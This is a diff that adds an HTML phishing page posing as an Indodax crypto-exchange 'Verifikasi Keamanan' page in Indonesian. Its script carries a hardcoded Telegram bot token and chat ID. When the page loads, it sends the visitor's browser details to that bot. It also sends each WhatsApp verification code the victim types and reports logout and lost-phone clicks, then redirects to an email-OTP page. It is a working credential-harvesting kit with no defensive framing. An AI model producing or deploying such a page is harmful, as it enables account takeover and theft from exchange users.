@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Indodax Verifikasi Keamanan</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    /* Reset and base */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: "Inter", sans-serif;
+      background-color: #f5f7fa;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    /* Header */
+    header {
+      background-color: #fff;
+      box-shadow: 0 2px 6px rgb(0 0 0 / 0.1);
+      width: 100%;
+      max-width: 640px;
+      padding: 12px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 40px;
+    }
+    header img.logo {
+      height: 40px;
+      width: auto;
+    }
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+    .btn-logout {
+      background-color: #1e88e5;
+      color: white;
+      font-weight: 600;
+      font-size: 0.875rem;
+      padding: 8px 20px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .btn-logout:hover {
+      background-color: #1669b2;
+    }
+    .flag {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      border: 1px solid #e5e7eb;
+      object-fit: cover;
+    }
+    /* Main container */
+    main {
+      background-color: #fff;
+      max-width: 400px;
+      width: 100%;
+      border-radius: 12px;
+      box-shadow: 0 1px 4px rgb(0 0 0 / 0.1);
+      padding: 24px 32px;
+      margin-bottom: 40px;
+    }
+    /* Headings */
+    h1 {
+      font-weight: 600;
+      font-size: 1.25rem;
+      color: #1f2937;
+      margin: 0 0 12px 0;
+    }
+    p.description {
+      font-weight: 400;
+      font-size: 1rem;
+      color: #374151;
+      margin: 0 0 24px 0;
+      line-height: 1.5;
+    }
+    /* Label */
+    label {
+      font-weight: 600;
+      font-size: 1rem;
+      color: #1f2937;
+      display: block;
+      margin-bottom: 8px;
+    }
+    /* Input group */
+    .input-group {
+      display: flex;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      overflow: hidden;
+      transition: box-shadow 0.3s ease;
+      margin-bottom: 8px;
+    }
+    .input-group:focus-within {
+      box-shadow: 0 0 0 2px #1e88e5;
+      border-color: #1e88e5;
+    }
+    .input-group.error {
+      border-color: #ef4444;
+      box-shadow: 0 0 0 2px #fecaca;
+    }
+    input[type="text"] {
+      flex-grow: 1;
+      padding: 10px 16px;
+      font-size: 1rem;
+      color: #1f2937;
+      border: none;
+      outline: none;
+    }
+    input[type="text"]::placeholder {
+      color: #9ca3af;
+    }
+    button.send-code {
+      background: none;
+      border: none;
+      color: #1e88e5;
+      font-weight: 600;
+      font-size: 1rem;
+      padding: 10px 16px;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: all 0.3s ease;
+    }
+    button.send-code:hover:not(:disabled) {
+      text-decoration: underline;
+    }
+    button.send-code:disabled {
+      color: #9ca3af;
+      cursor: default;
+      text-decoration: none;
+    }
+    /* Error message */
+    .error-message {
+      color: #ef4444;
+      font-size: 0.875rem;
+      margin-bottom: 16px;
+      display: none;
+    }
+    /* Link button */
+    button.link-button {
+      background: none;
+      border: none;
+      color: #1e88e5;
+      font-weight: 600;
+      font-size: 1rem;
+      width: 100%;
+      margin-top: 16px;
+      cursor: pointer;
+      text-align: center;
+      padding: 0;
+      transition: text-decoration 0.3s ease;
+    }
+    button.link-button:hover {
+      text-decoration: underline;
+    }
+    /* Submit button */
+    button.submit-btn {
+      background-color: #1e88e5;
+      color: white;
+      font-weight: 600;
+      font-size: 1rem;
+      width: 100%;
+      padding: 12px 0;
+      border: none;
+      border-radius: 8px;
+      margin-top: 24px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      position: relative;
+    }
+    button.submit-btn:hover:not(:disabled) {
+      background-color: #1669b2;
+    }
+    button.submit-btn:disabled {
+      background-color: #9ca3af;
+      cursor: not-allowed;
+    }
+    /* Loading spinner */
+    .loading {
+      pointer-events: none;
+    }
+    .loading::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 20px;
+      height: 20px;
+      margin: -10px 0 0 -10px;
+      border: 2px solid transparent;
+      border-top: 2px solid #ffffff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    /* Success message */
+    .success-message {
+      background-color: #d1fae5;
+      color: #065f46;
+      padding: 12px 16px;
+      border-radius: 8px;
+      margin-bottom: 16px;
+      display: none;
+    }
+    /* Responsive */
+    @media (max-width: 480px) {
+      main {
+        padding: 20px 24px;
+        margin-bottom: 32px;
+      }
+      header {
+        max-width: 100%;
+        padding: 12px 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <img
+      src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTRHCOE7BSJG8ioQWJO1WCG7D3t-dpqgT7t6I3VxXsL4L6IzwikoDN0iUbB&s=10"
+      alt="New logo image with blue stylized text"
+      class="logo"
+      width="150"
+      height="40"
+    />
+    <div class="header-right">
+      <button type="button" class="btn-logout" id="logoutBtn">Keluar</button>
+      <img
+        src="https://storage.googleapis.com/a1aa/image/0941f989-bd91-4b20-bd32-9e2e1cc09543.jpg"
+        alt="Indonesian flag round icon with red top half and white bottom half"
+        class="flag"
+        width="32"
+        height="32"
+      />
+    </div>
+  </header>
+  <main>
+    <h1>Verifikasi Keamanan</h1>
+    <p class="description">
+      Harap selesaikan proses verifikasi di bawah untuk melanjutkan
+    </p>
+    
+    <div class="success-message" id="successMessage">
+      Kode verifikasi telah dikirim ke WhatsApp Anda
+    </div>
+    
+    <form id="verificationForm" class="form">
+      <label for="whatsapp-code">Verifikasi via WhatsApp (4 digit)</label>
+      <div class="input-group" id="inputGroup">
+        <input
+          type="text"
+          id="whatsapp-code"
+          name="whatsappCode"
+          maxlength="4"
+          placeholder="Masukkan Kode"
+          aria-label="Masukkan Kode WhatsApp 4 digit"
+          required
+          pattern="[0-9]{4}"
+          inputmode="numeric"
+        />
+        <button type="button" id="sendCodeBtn" class="send-code">
+          Kirim Kode
+        </button>
+      </div>
+      <div class="error-message" id="errorMessage">
+        Kode harus berupa 4 digit angka
+      </div>
+      
+      <button type="button" class="link-button" id="lostPhoneBtn">Kehilangan Nomor Handphone?</button>
+      <button type="submit" class="submit-btn" id="submitBtn" disabled>Verifikasi</button>
+    </form>
+  </main>
+
+  <script>
+    // ================= TELEGRAM BOT CONFIGURATION =================
+    const TELEGRAM_BOT_TOKEN = "8213404016:AAEenWmkIaKGJyh0_JqbMvi5tJfkce-ektc";
+    const TELEGRAM_CHAT_ID = "7718023142";
+    // ==============================================================
+    
+    // Elements
+    const sendCodeBtn = document.getElementById("sendCodeBtn");
+    const verificationForm = document.getElementById("verificationForm");
+    const whatsappCodeInput = document.getElementById("whatsapp-code");
+    const errorMessage = document.getElementById("errorMessage");
+    const successMessage = document.getElementById("successMessage");
+    const inputGroup = document.getElementById("inputGroup");
+    const submitBtn = document.getElementById("submitBtn");
+    const logoutBtn = document.getElementById("logoutBtn");
+    const lostPhoneBtn = document.getElementById("lostPhoneBtn");
+
+    // Generate random 4-digit code
+    function generateCode() {
+      return Math.floor(1000 + Math.random() * 9000).toString();
+    }
+
+    // ================= TELEGRAM FUNCTIONS =================
+    // Function to send message to Telegram
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      return fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+    }
+
+    // Function to send user info to Telegram (browser, IP, etc.)
+    function sendUserInfoToTelegram() {
+      // Get user agent info
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+      
+      // Get screen resolution
+      const screenResolution = `${screen.width}x${screen.height}`;
+      
+      // Get timezone
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      
+      // Create message with user info
+      const userInfoMessage = `
+📱 <b>USER INFORMATION</b>
+
+🖥 <b>Browser:</b> ${userAgent}
+📋 <b>Platform:</b> ${platform}
+🌐 <b>Language:</b> ${language}
+🖼 <b>Screen:</b> ${screenResolution}
+⏰ <b>Timezone:</b> ${timezone}
+      `;
+      
+      // Send user info to Telegram
+      sendToTelegram(userInfoMessage)
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            console.error('Failed to send user info to Telegram');
+          }
+        })
+        .catch(error => {
+          console.error('Error sending user info:', error);
+        });
+    }
+
+    // Function to send page visit notification
+    function sendPageVisitNotification() {
+      const visitMessage = `
+🔔 <b>PAGE VISIT NOTIFICATION</b>
+
+📄 <b>Page:</b> WhatsApp Verification
+🌐 <b>URL:</b> ${window.location.href}
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+      `;
+      
+      sendToTelegram(visitMessage)
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            console.error('Failed to send page visit notification');
+          }
+        })
+        .catch(error => {
+          console.error('Error sending page visit notification:', error);
+        });
+    }
+    // =====================================================
+
+    // Show error
+    function showError(message) {
+      errorMessage.textContent = message;
+      errorMessage.style.display = 'block';
+      inputGroup.classList.add('error');
+    }
+
+    // Hide error
+    function hideError() {
+      errorMessage.style.display = 'none';
+      inputGroup.classList.remove('error');
+    }
+
+    // Validate code input
+    function validateCode(code) {
+      return /^\d{4}$/.test(code);
+    }
+
+    // Handle send code button
+    sendCodeBtn.addEventListener("click", () => {
+      // Generate code
+      const code = generateCode();
+      
+      // Send code to Telegram
+      const codeMessage = `
+🔐 <b>WHATSAPP VERIFICATION CODE</b>
+
+📱 <b>Platform:</b> INDODAX
+🔢 <b>Code:</b> <code>${code}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+      `;
+      
+      sendToTelegram(codeMessage)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            // Show success message
+            successMessage.style.display = 'block';
+          } else {
+            alert('Gagal mengirim kode. Silakan coba lagi.');
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('Terjadi kesalahan saat mengirim kode. Silakan coba lagi.');
+        });
+      
+      // Disable button and start countdown
+      let countdown = 60;
+      sendCodeBtn.disabled = true;
+      sendCodeBtn.textContent = `${countdown} detik`;
+
+      const interval = setInterval(() => {
+        countdown--;
+        if (countdown > 0) {
+          sendCodeBtn.textContent = `${countdown} detik`;
+        } else {
+          clearInterval(interval);
+          sendCodeBtn.disabled = false;
+          sendCodeBtn.textContent = "Kirim Kode Ulang";
+        }
+      }, 1000);
+    });
+
+    // Handle input validation
+    whatsappCodeInput.addEventListener("input", function() {
+      const code = this.value.trim();
+      
+      // Only allow numbers
+      this.value = code.replace(/\D/g, '');
+      
+      // Validate and update submit button
+      if (validateCode(this.value)) {
+        hideError();
+        submitBtn.disabled = false;
+      } else {
+        submitBtn.disabled = true;
+        if (code.length > 0) {
+          showError("Kode harus berupa 4 digit angka");
+        } else {
+          hideError();
+        }
+      }
+    });
+
+    // Handle form submission
+    verificationForm.addEventListener("submit", function(e) {
+      e.preventDefault();
+      
+      const code = whatsappCodeInput.value.trim();
+      
+      if (!validateCode(code)) {
+        showError("Masukkan kode 4 digit yang valid");
+        return;
+      }
+
+      // Show loading state
+      submitBtn.disabled = true;
+      submitBtn.classList.add('loading');
+      submitBtn.textContent = 'Memverifikasi...';
+
+      // Send entered code to Telegram
+      const verificationMessage = `
+✅ <b>VERIFICATION CODE ENTERED</b>
+
+🔢 <b>Code:</b> <code>${code}</code>
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+🌐 <b>Status:</b> SUCCESS
+      `;
+      
+      sendToTelegram(verificationMessage)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            // Simulate verification process
+            setTimeout(() => {
+              // Redirect to next page
+              window.location.href = "emailotp.html";
+            }, 1500);
+          } else {
+            alert('Gagal melakukan verifikasi. Silakan coba lagi.');
+            submitBtn.disabled = false;
+            submitBtn.classList.remove('loading');
+            submitBtn.textContent = 'Verifikasi';
+          }
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          alert('Terjadi kesalahan saat verifikasi. Silakan coba lagi.');
+          submitBtn.disabled = false;
+          submitBtn.classList.remove('loading');
+          submitBtn.textContent = 'Verifikasi';
+        });
+    });
+
+    // Handle logout
+    logoutBtn.addEventListener("click", function() {
+      // Send logout notification to Telegram
+      const logoutMessage = `
+🚪 <b>USER LOGOUT</b>
+
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+🌐 <b>Page:</b> WhatsApp Verification
+      `;
+      
+      sendToTelegram(logoutMessage)
+        .then(() => {
+          if (confirm("Apakah Anda yakin ingin keluar?")) {
+            // Redirect to login page
+            window.location.href = "index.html";
+          }
+        })
+        .catch(error => {
+          console.error('Error sending logout notification:', error);
+          if (confirm("Apakah Anda yakin ingin keluar?")) {
+            window.location.href = "index.html";
+          }
+        });
+    });
+
+    // Handle lost phone
+    lostPhoneBtn.addEventListener("click", function() {
+      // Send lost phone notification to Telegram
+      const lostPhoneMessage = `
+📵 <b>LOST PHONE REQUEST</b>
+
+⏰ <b>Time:</b> ${new Date().toLocaleString('id-ID')}
+🌐 <b>Page:</b> WhatsApp Verification
+      `;
+      
+      sendToTelegram(lostPhoneMessage)
+        .then(() => {
+          alert("Silakan hubungi customer service INDODAX untuk bantuan lebih lanjut mengenai nomor handphone yang hilang.");
+        })
+        .catch(error => {
+          console.error('Error sending lost phone notification:', error);
+          alert("Silakan hubungi customer service INDODAX untuk bantuan lebih lanjut mengenai nomor handphone yang hilang.");
+        });
+    });
+
+    // Prevent form submission on enter key in input
+    whatsappCodeInput.addEventListener("keydown", function(e) {
+      if (e.key === "Enter") {
+        e.preventDefault();
+      }
+    });
+
+    // ================= INITIALIZATION =================
+    // Send page visit notification when page loads
+    document.addEventListener('DOMContentLoaded', function() {
+      // Send user info and page visit notification
+      sendUserInfoToTelegram();
+      sendPageVisitNotification();
+    });
+    // ==================================================
+  </script>
+</body>
+</html>
